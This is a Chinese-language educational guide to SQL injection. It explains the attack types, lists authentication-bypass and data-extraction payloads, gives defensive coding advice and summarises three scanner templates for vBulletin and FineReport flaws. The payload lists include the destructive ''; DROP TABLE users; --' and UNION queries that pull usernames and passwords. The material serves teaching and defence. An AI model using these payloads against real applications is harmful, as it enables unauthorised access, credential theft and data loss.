# SQL 注入 (SQL Injection)

> SQL 注入（SQL Injection）是一种安全漏洞，允许攻击者干扰应用程序对数据库的查询。SQL 注入是最常见和最严重的 Web 应用程序漏洞之一，使攻击者能够在数据库上执行任意 SQL 代码。这可能导致未经授权的数据访问、数据操纵，在某些情况下甚至完全控制数据库服务器。

## 目录

* [速查表](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/)
    * [MSSQL 注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
    * [MySQL 注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
    * [Oracle SQL 注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
    * [PostgreSQL 注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
    * [SQLite 注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

## 什么是 SQL 注入？

SQL 注入是一种代码注入技术，攻击者可以通过它执行恶意的 SQL 语句，从而控制 Web 应用程序的数据库服务器。当应用程序在未正确验证或转义用户输入的情况下，直接将用户输入拼接到 SQL 查询中时，就可能发生 SQL 注入漏洞。

## SQL 注入类型

1. **基于错误的 SQL 注入**
   - 通过错误消息获取数据库信息
   - 示例：`' OR 1=1 --`

2. **基于布尔的盲注**
   - 根据页面返回的真/假状态推断信息
   - 示例：`' OR 1=1 --` 与 `' OR 1=2 --` 的比较

3. **基于时间的盲注**
   - 通过数据库响应时间的延迟来推断信息
   - 示例：`'; IF (1=1) WAITFOR DELAY '0:0:5' --`

4. **联合查询注入**
   - 使用 UNION 操作符从其他表中检索数据
   - 示例：`' UNION SELECT username, password FROM users --`

5. **堆叠查询注入**
   - 执行多个 SQL 语句
   - 示例：`'; DROP TABLE users; --`

## 常见 SQL 注入有效载荷

### 认证绕过

```sql
admin' --
admin' #
admin'/*
' or '1'='1
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1'--
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
admin') or 1=1--
admin') or 1=1#
admin') or 1=1/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```

### 数据库版本检测

```sql
# MySQL
SELECT @@version
SELECT version()

# MSSQL
SELECT @@version

# Oracle
SELECT banner FROM v$version
SELECT version FROM v$instance

# PostgreSQL
SELECT version()
```

### 数据库内容提取

```sql
# 获取所有表名
SELECT table_name FROM information_schema.tables

# 获取所有列名
SELECT column_name FROM information_schema.columns WHERE table_name = 'users'

# 获取数据
SELECT username, password FROM users
```

## 防御措施

1. **使用参数化查询（预编译语句）**
   - 始终使用参数化查询而不是字符串拼接
   - 示例（Python）：
     ```python
     # 不安全的写法
     cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")
     
     # 安全的写法
     cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
     ```

2. **使用 ORM**
   - 使用对象关系映射(ORM)框架，如 SQLAlchemy、Hibernate 等

3. **最小权限原则**
   - 数据库用户应仅具有所需的最小权限

4. **输入验证**
   - 对所有用户输入进行严格的验证
   - 使用白名单而不是黑名单

5. **错误处理**
   - 不要向用户显示详细的数据库错误信息

6. **使用 Web 应用防火墙(WAF)**
   - 部署 WAF 来检测和阻止 SQL 注入攻击

## 工具

- [sqlmap](http://sqlmap.org/) - 自动化 SQL 注入工具
- [jSQL Injection](https://github.com/ron190/jsql-injection) - 轻量级 SQL 注入工具
- [BBQSQL](https://github.com/Neohapsis/bbqsql) - SQL 注入利用框架

## 学习资源

- [OWASP SQL 注入防御指南](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL 注入实验室](https://portswigger.net/web-security/sql-injection)
- [SQL 注入速查表](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## 免责声明

本文档仅用于教育目的。请勿将其用于非法活动。在进行安全测试时，请确保您已获得适当的授权。

## 八、典型漏洞 YAML 文件分析

本目录及上级目录收录了多个与 SQL 注入相关的漏洞利用模板，以下对部分典型 YAML 文件进行详细解读：

### 1. CVE-2020-12720.yaml
- **漏洞类型**：SQL 注入（vBulletin）
- **漏洞原理**：
  vBulletin 某些版本存在访问控制不当，攻击者可通过构造恶意 SQL 语句注入数据库，实现未授权访问、数据泄露甚至系统控制。
- **探测原理**：
  该模板通过 POST 请求注入联合查询 SQL 语句，若响应中出现特定标识（如 vbulletinrce），则判定存在漏洞。
- **修复建议**：升级 vBulletin 至安全版本，修复 SQL 注入点。

### 2. vbulletin-ajaxreg-sqli.yaml
- **漏洞类型**：SQL 注入（盲注，vBulletin AjaxReg）
- **漏洞原理**：
  vBulletin 3.x/4.x 的 AjaxReg 功能存在盲注漏洞，攻击者可通过 time-based payload 验证注入点。
- **探测原理**：
  该模板通过注入 sleep(6) 等延时语句，若响应延迟明显且状态码为 200，则判定存在漏洞。
- **修复建议**：修复相关 SQL 拼接逻辑，过滤用户输入。

### 3. finereport-sqli-rce.yaml
- **漏洞类型**：SQL 注入导致远程代码执行（FineReport）
- **漏洞原理**：
  FineReport 某接口参数可被注入 SQL，利用 sum 等函数可实现任意 SQL 执行，甚至远程命令执行。
- **探测原理**：
  该模板通过 GET 请求注入表达式，若响应中出现特定计算结果，则判定存在漏洞。
- **修复建议**：升级 FineReport，修复 SQL 注入点。

---

#### 总结
SQL 注入漏洞常见于对用户输入未做有效过滤和参数化处理的场景。攻击者可利用注入点执行任意 SQL 语句，造成数据泄露、篡改、甚至系统控制。防御措施包括：
- 所有输入参数均应参数化处理，避免拼接 SQL
- 严格过滤和校验用户输入
- 限制数据库账户权限，最小化风险
- 定期安全测试和代码审计
